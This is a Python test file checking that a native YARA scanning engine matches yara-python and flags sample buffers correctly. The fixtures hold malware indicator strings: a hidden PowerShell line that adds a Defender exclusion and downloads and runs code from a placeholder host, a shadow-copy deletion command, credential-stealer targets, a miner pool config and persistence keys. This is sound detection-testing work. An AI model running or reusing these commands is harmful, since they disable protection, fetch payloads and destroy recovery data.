"""C++ YARA engine (libyara) — equivalence with yara-python and safety properties."""

from __future__ import annotations

import random
import subprocess
import sys
import threading
from pathlib import Path

import pytest

yara = pytest.importorskip("yara")

ROOT = Path(__file__).resolve().parents[2]
DETECTION_DIR = ROOT / "signatures" / "yara"
INDICATORS = ROOT / "signatures" / "internal" / "indicators.yar"
EXTERNALS = {"filename": "", "filepath": "", "extension": "", "filetype": ""}


def _eicar() -> bytes:
    return ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-" + "TEST-FILE!$H+H*").encode()


def _buffers() -> dict[str, bytes]:
    rng = random.Random(42)
    wide = lambda s: s.encode("utf-16-le")  # noqa: E731
    bufs = {
        "eicar": _eicar(),
        "eicar_ws": _eicar() + b"\r\n  ",
        "eicar_late": b"x" + _eicar(),
        "random": rng.randbytes(20000),
        "stealer": b"MZ" + b"\0" * 64 + b"Google\\Chrome\\User Data\\Default\\Login Data\0encrypted_key\0"
                   + wide("discord\\Local Storage\\leveldb") + b"\0wallet.dat\0"
                   + b"https://discord.com/api/webhooks/123456789012/abcdef\0CryptUnprotectData",
        "miner": b"xmrig 6.21 --donate-level=1 randomx stratum+tcp://pool.supportxmr.com:3333 \"user\": \"4A\" \"pass\": \"x\"",
        "quasar": b"MZ" + b"\0" * 100 + b"Quasar.Client.Networking\0" + wide("Quasar.Common.Messages"),
        "dropper_ps": "powershell -w hidden Add-MpPreference -ExclusionPath C:\\ ; IEX (New-Object Net.WebClient)"
                      ".DownloadString('http://x')".encode(),
        "ransom": b"vssadmin delete shadows /all /quiet\0YOUR FILES HAVE BEEN ENCRYPTED. To decrypt your files send bitcoin",
        "mixed_case_wide": wide("SCHTASKS /CREATE /SC ONLOGON") + b"\0" + wide("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        "keylog": b"[BACKSPACE] [ENTER] [CAPSLOCK] [SHIFT] SetWindowsHookExW",
    }
    corpus_dir = ROOT / "tests" / "corpus_pe"
    sys.path.insert(0, str(corpus_dir))
    import build_corpus

    if build_corpus.available():
        import tempfile

        out = Path(tempfile.mkdtemp(prefix="gk-yara-corpus-"))
        for p in build_corpus.build(out)[:6]:
            bufs[p.name] = p.read_bytes()
    return bufs


BUFFERS = _buffers()


def _rule_files() -> list[Path]:
    return sorted(DETECTION_DIR.glob("*.yar")) + [INDICATORS]


def _py_rules():
    files = _rule_files()
    return yara.compile(filepaths={f"ns{i}": str(p) for i, p in enumerate(files)}, externals=EXTERNALS)


def _meta_text(value) -> str:
    if isinstance(value, bool):
        return "true" if value else "false"
    return str(value)


def _py_decode(data: bytes) -> str:
    from gamekernel.engines.yara_engine import _decode_match

    return _decode_match(data)


def _py_matches(rules, data: bytes, filename: str = "") -> dict:
    out = {}
    for m in rules.match(data=data, externals={**EXTERNALS, "filename": filename}):
        strings = set()
        excerpts = {}
        for sm in m.strings:
            for inst in sm.instances[:3]:
                strings.add((sm.identifier, inst.offset, inst.matched_length))
                excerpts[(sm.identifier, inst.offset)] = _py_decode(inst.matched_data)
        out[m.rule] = (m.namespace, sorted(m.tags), {k: _meta_text(v) for k, v in m.meta.items()}, strings, excerpts)
    return out


def _native_matches(rules, data: bytes, filename: str = "") -> dict:
    result = rules.scan(data, filename=filename, max_instances=3, max_strings=10000)
    assert not result["error"] and not result["timed_out"]
    out = {}
    for m in result["matches"]:
        strings = {(s["identifier"], s["offset"], s["length"]) for s in m["strings"]}
        excerpts = {(s["identifier"], s["offset"]): s["excerpt"] for s in m["strings"]}
        out[m["rule"]] = (m["namespace"], sorted(m["tags"]), m["meta"], strings, excerpts)
    return out


@pytest.fixture(scope="module")
def both(native):
    rules, report = native.YaraRules.compile_files([str(p) for p in _rule_files()])
    assert report["ok"], report["errors"]
    return rules, _py_rules()


def test_rule_counts_match(both):
    native_rules, py_rules = both
    assert native_rules.rule_count == sum(1 for _ in py_rules)


@pytest.mark.parametrize("name", sorted(BUFFERS))
def test_scan_equivalence(both, name):
    native_rules, py_rules = both
    ours = _native_matches(native_rules, BUFFERS[name])
    theirs = _py_matches(py_rules, BUFFERS[name])
    assert set(ours) == set(theirs), name
    for rule in theirs:
        assert ours[rule][:4] == theirs[rule][:4], (name, rule)
        assert ours[rule][4] == theirs[rule][4], (name, rule, "excerpt")


def test_expected_detections(both):
    native_rules, _ = both
    hits = lambda key: set(_native_matches(native_rules, BUFFERS[key]))  # noqa: E731
    assert "GK_Test_EICAR" in hits("eicar") and "GK_Test_EICAR" in hits("eicar_ws")
    assert "GK_Test_EICAR" not in hits("eicar_late")
    assert {"GK_Stealer_Multi_Target", "IND_browser_login_db", "IND_discord_webhook"} <= hits("stealer")
    assert {"GK_PUA_Miner_XMRig", "GK_Miner_Stratum_Configuration"} <= hits("miner")
    assert "GK_RAT_Quasar" in hits("quasar")
    assert "GK_Defender_Exclusion_With_Download" in hits("dropper_ps")
    assert "GK_Ransomware_Recovery_Inhibition_With_Note" in hits("ransom")
    assert {"IND_schtasks", "IND_run_key"} <= hits("mixed_case_wide")
    assert "IND_keylog_labels" in hits("keylog")
    assert not {r for r in hits("random") if r.startswith("GK_")}


def test_externals(native):
    rules, report = native.YaraRules.compile_source(
        'rule crack_name { meta: category = "crack_component" severity = "INFO" condition: filename matches /crack/i }')
    assert report["ok"]
    assert [m["rule"] for m in rules.scan(b"x", filename="Game_CRACK.exe")["matches"]] == ["crack_name"]
    assert rules.scan(b"x", filename="game.exe")["matches"] == []


def test_include_directives_are_rejected(native, tmp_path):
    secret = tmp_path / "other.yar"
    secret.write_text('rule other { condition: true }')
    rules, report = native.YaraRules.compile_source(f'include "{secret.as_posix()}"\nrule a {{ condition: true }}')
    assert rules is None and not report["ok"] and report["errors"]


def test_broken_file_does_not_disable_valid_ones(native, tmp_path):
    good = tmp_path / "good.yar"
    good.write_text('rule ok_rule { meta: category = "informational" severity = "INFO" strings: $a = "abc" condition: $a }')
    bad = tmp_path / "bad.yar"
    bad.write_text("rule broken { condition: undefined_identifier }")
    rules, report = native.YaraRules.compile_files([str(good), str(bad)])
    assert rules is not None and rules.rule_count == 1
    assert not report["ok"] and any("bad.yar" in e for e in report["errors"])
    assert [m["rule"] for m in rules.scan(b"xxabcxx")["matches"]] == ["ok_rule"]


def test_validate_dir(native, tmp_path):
    assert native.yara_validate_dir(DETECTION_DIR)["ok"]
    assert not native.yara_validate_dir(INDICATORS.parent)["ok"]  # indicator rules lack detection metadata
    assert not native.yara_validate_dir(tmp_path)["ok"]


def test_save_load_roundtrip(native, both, tmp_path):
    native_rules, _ = both
    target = tmp_path / "rules.yarc"
    native_rules.save(target)
    loaded = native.YaraRules.load(target)
    assert loaded.rule_count == native_rules.rule_count
    assert _native_matches(loaded, BUFFERS["miner"]) == _native_matches(native_rules, BUFFERS["miner"])
    target.write_bytes(b"garbage")
    with pytest.raises(native.GkError):
        native.YaraRules.load(target)


def test_concurrent_scans_are_consistent(both):
    native_rules, _ = both
    expected = {k: _native_matches(native_rules, v) for k, v in BUFFERS.items()}
    errors = []

    def worker(seed):
        rng = random.Random(seed)
        for _ in range(30):
            key = rng.choice(list(BUFFERS))
            if _native_matches(native_rules, BUFFERS[key]) != expected[key]:
                errors.append(key)

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(6)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert not errors


def test_generated_indicator_rules_are_up_to_date():
    result = subprocess.run([sys.executable, str(ROOT / "tools" / "core_gen_indicators.py"), "--check"],
                            capture_output=True, text=True)
    assert result.returncode == 0, result.stderr
